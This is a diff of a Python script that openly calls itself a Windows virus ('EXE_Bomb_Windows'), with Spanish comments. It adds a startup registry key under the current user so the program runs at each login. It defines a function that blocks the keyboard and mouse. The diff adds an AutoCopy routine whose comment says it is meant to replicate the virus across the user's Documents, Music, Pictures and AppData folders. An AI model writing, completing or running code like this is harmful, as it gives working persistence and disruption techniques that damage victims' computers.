@@ -8,6 +8,8 @@ from multiprocessing import Process
 import threading
 import shutil
       
+
+          
 def addStartup():  # function =  Iniciar automaticamente
     path = r"C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\EXE_Bomb_Windows.exe"        # Path del Software completo
     name = "EXE_Bomb_Windows"                                                       # Nombre del StartUp
@@ -25,8 +27,7 @@ def addStartup():  # function =  Iniciar automaticamente
     except: # Si no tien permisos de administrador
         if (verificar()):
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
-            SetValueEx(registry,name, 0, REG_SZ, path)
-                      
+            SetValueEx(registry,name, 0, REG_SZ, path)            
 def Block():            # Lib [KeyandMouse_Block]
     mouse = Controller()  
     def BlockMouse():
@@ -51,24 +52,58 @@ def CreateFileMain():   #
         except:
             return False
         pass
-
+def AutoCopy():
+    user        = str(getuser())
+    documentos  = 'C:\\Users\\'+user+'\\Documents'
+    music       = 'C:\\Users\\'+user+'\\Music'
+    video       = 'C:\\Users\\'+user+'\\Videos'
+    picture     = 'C:\\Users\\'+user+'\\Pictures'
+    download    = 'C:\\Users\\'+user+'\\Downloads'
+    roaming     = 'C:\\Users\\'+user+'\\AppData\\Roaming\\VirusBomb'
+    locallow    = 'C:\\Users\\'+user+'\\AppData\\LocalLow\\VirusBomb'
+    local       = 'C:\\Users\\'+user+'\\AppData\\Local\\VirusBomb'
+    def CreateFolder():
+        try:  # Intenta crear la dirección 
+            os.makedirs(documentos)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(music)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(video)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(picture)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(download)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(roaming)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(locallow)
+        except:
+            pass
+        try:  # Intenta crear la dirección 
+            os.makedirs(local)
+        except:
+            pass
+    
         
         
-def saturar():
-    pass
-
-
+        
     
-    
-    # si crear directorio es true , entonces cerrar, 
-    # si crear directorio es false
-    # continuar
-    return False
-
 
 
 if __name__ == '__main__':
-    if (CreateFileMain()):  # Primer inicio
+    if (CreateFileMain()):  # Se ejecuta en el primer inicio
         nameKey = "EXE_Bomb_Windows.exe"
         filePath = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+ nameKey 
         try:     
@@ -85,10 +120,12 @@ if __name__ == '__main__':
         addStartup()
         print("se creó la carpeta y startup exitoso, virus deshabilitado")
         exit()
-    else:                   # Segundo inicio
+    else:                   # Solo se ejecuta si la PC ya está infectada
         #block= threading.Thread(target=Block)   # Bloquea Teclado y mouse
+        #autocopy= threading.Thread(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
+        
         #block.start()
-                   
+        #autocopy.start()         
         
         
         
